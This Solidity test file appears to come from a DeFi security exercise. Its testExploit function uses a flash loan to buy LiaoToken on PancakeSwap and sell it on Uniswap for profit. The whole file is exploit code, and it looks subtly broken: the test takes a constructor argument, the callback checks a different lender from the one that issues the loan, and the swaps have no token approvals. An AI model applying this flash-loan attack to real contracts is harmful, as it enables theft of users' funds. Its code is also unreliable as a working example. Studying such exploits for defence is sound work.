// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {SashaV2BaseTest} from "./SashaV2Base.t.sol";

import "../../src/interface.sol";

// Assuming you have a library that provides these interfaces
import {IERC3156FlashLender} from "../../lib/openzeppelin-contracts/contracts/interfaces/IERC3156FlashLender.sol";
import {IERC3156FlashBorrower} from "../../lib/openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SashaV2Test is SashaV2BaseTest, IERC3156FlashBorrower {
    IERC3156FlashLender public flashLender;

    constructor(address _flashLender) {
        flashLender = IERC3156FlashLender(_flashLender);
    }

    function testExploit() public validation {
        // Step 1: Determine the loan amount and fee
        uint256 loanAmount = 1000 ether; // Example amount
        // Step 2: Initiate the flash loan
        bytes memory data = ""; // Custom data for the flash loan
        flashLender.flashLoan(this, DAI, loanAmount, data);
    }

    // Flash loan callback function
    function onFlashLoan(
        address initiator,
        address,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external override returns (bytes32) {
        require(msg.sender == Balancer, "Unauthorized lender");
        require(initiator == address(this), "Unauthorized initiator");

        // Step 3: Execute arbitrage
        // Buy from PancakeSwap (lower price)
        address[] memory path = new address[](2);
        path[0] = DAI;
        path[1] = LiaoToken;
        PankcakeRouter.swapExactTokensForTokens(amount, 0, path, address(this), block.timestamp);

        // Sell on Uniswap (higher price)
        path[0] = LiaoToken;
        path[1] = DAI;
        UniRouter.swapExactTokensForTokens(ERC20(LiaoToken).balanceOf(address(this)), 0, path, address(this), block.timestamp);

        // Step 4: Repay the flash loan
        ERC20(DAI).transfer(address(flashLender), amount + fee);

        // Step 5: Profit is the remaining DAI balance
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}